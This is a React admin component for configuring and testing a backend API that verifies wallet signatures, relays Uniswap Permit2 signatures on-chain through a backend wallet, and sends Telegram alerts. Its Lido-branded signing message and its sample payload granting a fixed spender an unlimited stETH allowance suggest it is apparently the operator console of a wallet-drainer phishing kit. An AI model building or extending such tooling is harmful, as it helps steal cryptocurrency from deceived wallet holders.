import React, { useState, useEffect } from 'react';
import {
  Server,
  Save,
  RotateCcw,
  Check,
  Globe,
  Radio,
  CheckCircle2,
  AlertTriangle,
  RefreshCw,
  Send,
  Code,
  Copy,
  Terminal,
  Layers,
  ArrowRight,
  Shield
} from 'lucide-react';
import { useAccount } from 'wagmi';
import { getApiBaseUrl, setApiBaseUrl, resetApiBaseUrl, logApiCall } from '../lib/apiConfig';
import { useToast } from './ToastContext';

interface EndpointInfo {
  path: string;
  method: 'GET' | 'POST';
  description: string;
  payloadExample?: object;
}

export function BackendApiEndpointsHub() {
  const { address } = useAccount();
  const toast = useToast();

  const [inputUrl, setInputUrl] = useState<string>('');
  const [activeBaseUrl, setActiveBaseUrl] = useState<string>('');
  const [isSaved, setIsSaved] = useState<boolean>(false);

  const [healthStatus, setHealthStatus] = useState<'checking' | 'healthy' | 'unreachable'>('checking');
  const [healthLatency, setHealthLatency] = useState<number | null>(null);
  const [healthData, setHealthData] = useState<any>(null);

  // Live Test Console states
  const [selectedEndpoint, setSelectedEndpoint] = useState<string>('/api/verify-signature');
  const [customPayload, setCustomPayload] = useState<string>('');
  const [testResponse, setTestResponse] = useState<{ status: number; ok: boolean; data: any; latencyMs: number } | null>(null);
  const [isTesting, setIsTesting] = useState<boolean>(false);
  const [copiedText, setCopiedText] = useState<string | null>(null);

  const endpoints: EndpointInfo[] = [
    {
      path: '/api/verify-signature',
      method: 'POST',
      description: 'Verifies wallet cryptographic signatures, registers authentications, logs audit entries, and alerts Telegram.',
      payloadExample: {
        address: address || '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
        message: 'Lido Authentication Signature Verification',
        signature: '0x3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c1b',
        chainId: 1,
      },
    },
    {
      path: '/api/permit2',
      method: 'POST',
      description: 'Ingests Uniswap Permit2 typed data signatures and executes on-chain permit relays via backend relayer wallet.',
      payloadExample: {
        owner: address || '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
        tokenAddress: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
        spender: '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091',
        chainId: 1,
        permitSingle: {
          details: {
            token: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
            amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
            expiration: 1790000000,
            nonce: 0,
          },
          spender: '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091',
          sigDeadline: 1790000000,
        },
        signature: '0x3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c1b',
      },
    },
    {
      path: '/api/stake-with-permit2',
      method: 'POST',
      description: 'Gasless Permit2 Staking relay endpoint that submits permit & staking in a single atomic payload.',
      payloadExample: {
        owner: address || '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
        tokenAddress: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
        amount: '1000000000000000000',
        chainId: 1,
        permitSingle: {
          details: {
            token: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
            amount: '1000000000000000000',
            expiration: 1790000000,
            nonce: 0,
          },
          spender: '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091',
          sigDeadline: 1790000000,
        },
        signature: '0x...',
      },
    },
    {
      path: '/api/notify',
      method: 'POST',
      description: 'Dispatches real-time HTML formatted notifications and activity alerts to configured Telegram chat.',
      payloadExample: {
        message: '🔔 <b>Admin API Test Notification</b>\n\nBackend server connection active.',
      },
    },
    {
      path: '/api/health',
      method: 'GET',
      description: 'Container probes, server uptime, and environment health check.',
    },
  ];

  useEffect(() => {
    const currentBase = getApiBaseUrl();
    setActiveBaseUrl(currentBase);
    setInputUrl(currentBase);
    checkServerHealth(currentBase);
  }, []);

  // Set default payload when selecting endpoint
  useEffect(() => {
    const current = endpoints.find((e) => e.path === selectedEndpoint);
    if (current?.payloadExample) {
      setCustomPayload(JSON.stringify(current.payloadExample, null, 2));
    } else {
      setCustomPayload('');
    }
  }, [selectedEndpoint, address]);

  const handleSaveBaseUrl = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputUrl.trim()) return;

    try {
      // Validate URL format
      const formatted = inputUrl.trim().replace(/\/+$/, '');
      if (!formatted.startsWith('http://') && !formatted.startsWith('https://')) {
        toast.showError('Invalid URL', 'Endpoint URL must start with http:// or https://');
        return;
      }

      setApiBaseUrl(formatted);
      setActiveBaseUrl(formatted);
      setIsSaved(true);
      setTimeout(() => setIsSaved(false), 2500);

      toast.showSuccess('API Endpoint Saved', `Global backend service endpoint updated to ${formatted}`);
      checkServerHealth(formatted);
    } catch (e: any) {
      toast.showError('Save Failed', e.message || 'Could not save API endpoint');
    }
  };

  const handleResetBaseUrl = () => {
    const defaultUrl = resetApiBaseUrl();
    setActiveBaseUrl(defaultUrl);
    setInputUrl(defaultUrl);
    toast.showInfo('Reset to Default', `Backend API URL reset to origin: ${defaultUrl}`);
    checkServerHealth(defaultUrl);
  };

  const checkServerHealth = async (urlToCheck?: string) => {
    setHealthStatus('checking');
    const base = urlToCheck || activeBaseUrl || getApiBaseUrl();
    const start = performance.now();
    try {
      const res = await fetch(`${base}/api/health`);
      const latency = Math.round(performance.now() - start);
      setHealthLatency(latency);
      if (res.ok) {
        const data = await res.json();
        setHealthData(data);
        setHealthStatus('healthy');
      } else {
        setHealthStatus('unreachable');
      }
    } catch (e) {
      setHealthStatus('unreachable');
    }
  };

  const handleTestApi = async () => {
    setIsTesting(true);
    setTestResponse(null);
    const start = performance.now();
    const targetEndpoint = endpoints.find((e) => e.path === selectedEndpoint);
    const fullUrl = `${activeBaseUrl}${selectedEndpoint}`;

    try {
      let res: Response;
      let bodyJson: any = null;

      if (targetEndpoint?.method === 'GET') {
        res = await fetch(fullUrl);
      } else {
        try {
          bodyJson = customPayload ? JSON.parse(customPayload) : {};
        } catch (e) {
          alert('Invalid JSON in payload editor.');
          setIsTesting(false);
          return;
        }

        res = await fetch(fullUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(bodyJson),
        });
      }

      const latencyMs = Math.round(performance.now() - start);
      const data = await res.json().catch(() => ({ raw: 'Non-JSON response' }));

      // Record to global API Logs store
      logApiCall({
        endpoint: selectedEndpoint,
        method: targetEndpoint?.method || 'POST',
        status: res.ok ? 'SUCCESS' : 'FAILED',
        httpStatus: res.status,
        wallet: bodyJson?.address || bodyJson?.owner || address,
        latencyMs,
        requestPayload: bodyJson,
        responsePayload: data,
        errorMessage: res.ok ? undefined : (data.error || `HTTP ${res.status} error`),
      });

      setTestResponse({
        status: res.status,
        ok: res.ok,
        data,
        latencyMs,
      });
    } catch (err: any) {
      const latencyMs = Math.round(performance.now() - start);
      
      logApiCall({
        endpoint: selectedEndpoint,
        method: targetEndpoint?.method || 'POST',
        status: 'FAILED',
        httpStatus: 500,
        wallet: address,
        latencyMs,
        requestPayload: customPayload ? JSON.parse(customPayload || '{}') : {},
        errorMessage: err?.message || 'Network request failed',
      });

      setTestResponse({
        status: 500,
        ok: false,
        data: { error: err?.message || 'Network request failed' },
        latencyMs,
      });
    } finally {
      setIsTesting(false);
    }
  };

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="space-y-6">
      {/* Backend API Endpoint Configuration Panel (Stored in localStorage) */}
      <div className="bg-card rounded-2xl border border-border-main p-6 shadow-sm space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border-main pb-4">
          <div>
            <h2 className="font-bold text-base flex items-center gap-2 text-text-main">
              <Globe className="w-5 h-5 text-[#00A3FF]" />
              Backend API Endpoint Configuration
            </h2>
            <p className="text-xs text-text-secondary mt-0.5">
              Specify the global backend URL for the signature verification service & relay endpoints. Saved to <code>localStorage</code>.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <div
              className={`px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1.5 border ${
                healthStatus === 'healthy'
                  ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20'
                  : healthStatus === 'checking'
                  ? 'bg-amber-500/10 text-amber-500 border-amber-500/20'
                  : 'bg-red-500/10 text-red-500 border-red-500/20'
              }`}
            >
              {healthStatus === 'healthy' && <CheckCircle2 className="w-3.5 h-3.5" />}
              {healthStatus === 'checking' && <RefreshCw className="w-3.5 h-3.5 animate-spin" />}
              {healthStatus === 'unreachable' && <AlertTriangle className="w-3.5 h-3.5" />}
              <span>Backend Service: {healthStatus === 'healthy' ? `Active (${healthLatency}ms)` : healthStatus}</span>
            </div>

            <button
              onClick={() => checkServerHealth()}
              title="Ping Backend Health"
              className="p-1.5 rounded-lg border border-border-main bg-input hover:bg-input/80 text-text-secondary hover:text-text-main transition-colors"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        {/* Form to edit and save URL */}
        <form onSubmit={handleSaveBaseUrl} className="space-y-4">
          <div className="space-y-1.5">
            <label className="text-xs font-bold text-text-secondary block">
              Signature Verification & Relay Service URL (Base URL):
            </label>
            <div className="flex flex-col sm:flex-row gap-2">
              <div className="relative flex-1">
                <input
                  type="text"
                  value={inputUrl}
                  onChange={(e) => setInputUrl(e.target.value)}
                  placeholder="https://api.yourdomain.com or http://localhost:3000"
                  className="w-full bg-input border border-border-main rounded-xl px-4 py-2.5 text-xs font-mono text-text-main focus:outline-none focus:border-[#00A3FF]"
                  required
                />
              </div>

              <div className="flex gap-2">
                <button
                  type="submit"
                  className="px-4 py-2.5 bg-[#00A3FF] hover:bg-[#0090E6] text-white rounded-xl text-xs font-bold flex items-center gap-1.5 transition-all shadow-sm shrink-0"
                >
                  {isSaved ? <Check className="w-3.5 h-3.5" /> : <Save className="w-3.5 h-3.5" />}
                  <span>{isSaved ? 'Saved Locally!' : 'Save Endpoint URL'}</span>
                </button>

                <button
                  type="button"
                  onClick={handleResetBaseUrl}
                  title="Reset to default window.location.origin"
                  className="px-3 py-2.5 bg-input border border-border-main text-text-secondary hover:text-text-main rounded-xl text-xs font-semibold flex items-center gap-1 transition-colors shrink-0"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  <span>Reset Default</span>
                </button>
              </div>
            </div>
          </div>

          <div className="p-3 bg-input/40 rounded-xl border border-border-main text-[11px] text-text-secondary flex items-center justify-between">
            <div>
              <span className="font-bold text-text-main">Currently Applied Endpoint: </span>
              <code className="font-mono text-[#00A3FF] font-bold ml-1">{activeBaseUrl}</code>
            </div>
            <button
              type="button"
              onClick={() => copyText(activeBaseUrl)}
              className="text-text-secondary hover:text-text-main p-1 rounded"
              title="Copy active base URL"
            >
              {copiedText === activeBaseUrl ? <Check className="w-3 h-3 text-emerald-500" /> : <Copy className="w-3 h-3" />}
            </button>
          </div>
        </form>
      </div>

      {/* Endpoints Directory Table */}
      <div className="bg-card rounded-2xl border border-border-main p-6 shadow-sm space-y-4">
        <h3 className="text-sm font-bold text-text-main flex items-center gap-2">
          <Code className="w-4 h-4 text-[#00A3FF]" />
          Available Live API Endpoints & Routes
        </h3>

        <div className="overflow-x-auto rounded-xl border border-border-main bg-card">
          <table className="w-full text-left text-xs">
            <thead className="bg-input text-text-secondary font-medium border-b border-border-main">
              <tr>
                <th className="px-4 py-2.5">Method</th>
                <th className="px-4 py-2.5">Endpoint URL</th>
                <th className="px-4 py-2.5">Description & Purpose</th>
                <th className="px-4 py-2.5 text-right">Inspect in Console</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border-main">
              {endpoints.map((ep) => (
                <tr key={ep.path} className="hover:bg-input/40 transition-colors">
                  <td className="px-4 py-2.5 font-bold">
                    <span
                      className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                        ep.method === 'POST' ? 'bg-blue-500/10 text-blue-500 border border-blue-500/20' : 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20'
                      }`}
                    >
                      {ep.method}
                    </span>
                  </td>
                  <td className="px-4 py-2.5 font-mono font-semibold text-[#00A3FF]">
                    <div className="flex items-center gap-1">
                      <span>{ep.path}</span>
                      <button
                        onClick={() => copyText(`${activeBaseUrl}${ep.path}`)}
                        className="text-text-secondary hover:text-text-main opacity-60 hover:opacity-100"
                        title="Copy full URL"
                      >
                        <Copy className="w-3 h-3" />
                      </button>
                    </div>
                  </td>
                  <td className="px-4 py-2.5 text-text-secondary max-w-md">{ep.description}</td>
                  <td className="px-4 py-2.5 text-right">
                    <button
                      onClick={() => {
                        setSelectedEndpoint(ep.path);
                        if (ep.payloadExample) {
                          setCustomPayload(JSON.stringify(ep.payloadExample, null, 2));
                        }
                      }}
                      className="px-2.5 py-1 rounded bg-[#00A3FF]/10 text-[#00A3FF] hover:bg-[#00A3FF]/20 text-[11px] font-bold transition-colors"
                    >
                      Select in Console
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Interactive API Request Inspector Console */}
      <div className="p-6 bg-card rounded-2xl border border-border-main space-y-4 shadow-sm">
        <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border-main pb-3">
          <div className="flex items-center gap-2">
            <Radio className="w-4 h-4 text-[#00A3FF]" />
            <h3 className="text-sm font-bold text-text-main">Interactive Live API Inspection Console</h3>
          </div>
          <span className="text-xs font-mono text-text-secondary">
            Target: <code className="text-[#00A3FF] font-bold">{activeBaseUrl}{selectedEndpoint}</code>
          </span>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          {/* Request Editor */}
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-text-secondary">JSON Request Body Payload</label>
              <button
                type="button"
                onClick={() => {
                  const curr = endpoints.find((e) => e.path === selectedEndpoint);
                  if (curr?.payloadExample) {
                    setCustomPayload(JSON.stringify(curr.payloadExample, null, 2));
                  }
                }}
                className="text-[11px] text-[#00A3FF] hover:underline"
              >
                Reset Default Schema
              </button>
            </div>
            <textarea
              rows={9}
              value={customPayload}
              onChange={(e) => setCustomPayload(e.target.value)}
              placeholder={selectedEndpoint === '/api/health' ? 'No payload required for GET request' : '{\n  "address": "0x..."\n}'}
              disabled={selectedEndpoint === '/api/health'}
              className="w-full bg-input border border-border-main rounded-xl p-3 text-xs font-mono text-text-main focus:outline-none focus:border-[#00A3FF] disabled:opacity-50"
            />
            <button
              onClick={handleTestApi}
              disabled={isTesting}
              className="w-full py-2.5 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs flex items-center justify-center gap-2 transition-colors disabled:opacity-50 shadow-sm"
            >
              {isTesting ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
              <span>Execute Real API Call: {selectedEndpoint}</span>
            </button>
          </div>

          {/* Response Inspector */}
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-text-secondary">Live Server Response & Headers</label>
              {testResponse && (
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold font-mono ${
                    testResponse.ok ? 'bg-emerald-500/10 text-emerald-500' : 'bg-red-500/10 text-red-500'
                  }`}
                >
                  HTTP {testResponse.status} • {testResponse.latencyMs}ms
                </span>
              )}
            </div>

            <div className="bg-input border border-border-main rounded-xl p-3 h-56 overflow-y-auto text-xs font-mono">
              {testResponse ? (
                <pre className="text-text-main whitespace-pre-wrap">{JSON.stringify(testResponse.data, null, 2)}</pre>
              ) : (
                <div className="h-full flex items-center justify-center text-text-secondary text-center px-4">
                  <span>Execute a live API request to inspect real response payloads, status codes, and execution headers.</span>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
